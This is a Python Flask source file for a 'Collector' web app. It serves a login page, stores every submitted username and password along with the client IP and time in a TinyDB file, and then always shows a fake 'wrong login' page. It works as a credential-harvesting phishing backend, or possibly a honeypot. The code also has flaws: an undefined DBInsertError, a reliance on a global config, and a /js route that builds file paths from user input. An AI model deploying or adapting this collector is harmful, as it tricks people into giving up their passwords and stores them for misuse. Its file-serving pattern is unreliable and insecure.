from flask import Flask,request
from FLexceptions import PostError, UnknownError, ConfigError
from datetime import datetime
from tinydb import TinyDB
from os import getcwd, path
#from sys import stderr
#import sys

pwd= getcwd()
separator = path.sep
debug_flag = False

def print_page(page_path):
    try:
        page = open(pwd+separator+page_path)
        output = ""
        for line in page.readlines():
            output += line
        return output
    except:
        raise IOError

class Collector(Flask):
    def __init__(self, import_name, conf):
        super(Collector, self).__init__(import_name)
        self.add = conf['addresses']
        self.port = conf['port']
        self.db_path = conf['db_path']
        self.db = None

    def init_db(self):
        try:
            self.db = TinyDB(pwd+separator+conf['db_path'])
            print("[Collector]: db init'd")
        except IOError:
            print("[Collector]: db init failed")#, file = sys.stderr)
            raise ConfigError
        except:
            raise UnknownError

    def add_to_db(self, data):
        try:
            db = self.db
            entry = {
                "time": data['time'],
                "src_ip": data['ip'],
                "user": data['user'],
                "password": data['password']
            }
            if debug_flag:
                print(format(entry))
            db.insert(entry)
        except:
            raise DBInsertError

def create_app(import_name, conf):
    app = Collector(import_name, conf)
    app.init_db()

    @app.route("/")
    def login_serve():
        try:
            return print_page("webassets/index.html")
        except IOError:
            print("[Collector]: webassets/index.html not readable")#, file=sys.stderr)
            raise ConfigError
        except:
            raise UnknownError

    @app.route("/js/<jspath>")
    def js_serve(jspath):
        try:
            return print_page("webassets/js/{}".format(jspath))
        except IOError:
            print("[Collector]: js/{} not readable".format(jspath))#, file=sys.stderr)
            raise ConfigError
        except:
            raise UnknownError

    @app.route("/login", methods=['POST'])
    def collect():
        try:
            user = request.form.getlist('u')
            password = request.form.getlist('p')
            now = format(datetime.now())
            ip = request.remote_addr
            data = {
                "user": user,
                "password": password,
                "time": now,
                "ip": ip
            }
            app.add_to_db(data)
            return print_page("webassets/wrong_login.html")
        except IOError:
            print("[Collector]: webassets/wrong_login.html not readable")
            raise ConfigError
        except:
            raise PostError

    return app

if __name__ == "__main__":
    conf = {
        "addresses": "0.0.0.0",
        "port": 5003,
        "db_path": "default_db.json"
    }
    app = create_app("test_collector", conf)
    app.run(
        host = conf['addresses'],
        port = int(conf['port'])
    )
